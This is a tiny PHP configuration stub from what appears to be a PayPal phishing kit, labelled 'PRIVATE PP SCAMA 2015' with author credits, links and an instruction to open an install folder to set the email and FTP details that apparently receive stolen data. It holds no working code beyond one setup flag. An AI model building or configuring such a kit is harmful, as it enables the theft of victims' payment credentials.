<?php



/*

+----------------------------------+

�--- PRIVATE  PP SCAMA   2015 -----�

�--------- BY Dz[NO_o]B -----------�

�----------- GREETZ TO ------------�

�--- Dz Phoniex : Dz Injector -----�

�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/



// GO TO INSTALL FOLDER FROM YOUR BROWSERR TO SET EMAIL AND FTP DETAILS

$instal=0; // DON'T CHANGE

?>


